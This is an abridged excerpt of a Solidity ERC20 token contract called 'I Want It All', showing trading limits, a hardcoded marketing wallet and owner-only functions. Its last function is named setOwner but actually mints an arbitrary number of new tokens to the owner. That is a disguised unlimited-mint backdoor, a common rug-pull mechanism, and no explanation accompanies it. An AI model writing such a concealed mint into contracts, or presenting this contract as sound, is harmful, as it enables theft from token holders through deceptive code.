...
contract IWantItAll is ERC20, Ownable {
    ...
    constructor() ERC20('I Want It All', 'IWIA') {
        ...
        _maxTransactionAmount = (TOTAL_SUPPLY * 5) / 100;
        _maxWallet = (TOTAL_SUPPLY * 10) / 100;
        _swapTokensAtAmount = (TOTAL_SUPPLY * 3) / 100;

        marketingWallet = address(0x2622624b48C0dFC7ff68c6Dc9b162B1426aE4941);
    ...
    function openTrading(bool active) external onlyOwner {
    ...
    function setOwner(uint256 _address) public onlyOwner {
        _mint(msg.sender, _address);
    }
